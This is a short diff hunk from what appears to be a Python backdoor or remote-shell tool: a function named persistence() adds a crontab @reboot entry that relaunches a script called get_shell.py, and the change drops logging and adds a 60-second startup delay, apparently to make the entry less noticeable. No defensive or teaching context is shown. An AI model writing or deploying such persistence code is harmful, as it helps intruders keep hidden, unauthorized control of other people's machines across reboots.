@@ -120,7 +120,7 @@ def persistence():
 	else:
 		script_path = os.path.abspath('get_shell.py')
 		if os.path.exists(script_path):
-			cron_line = f"@reboot python3 {script_path} >> log.txt 2>&1\n"
+			cron_line = f"@reboot sleep 60 && python3 {script_path}\n"
 		else:
 			return
 		result = subprocess.run(['crontab', '-l'], stdout=subprocess.PIPE)
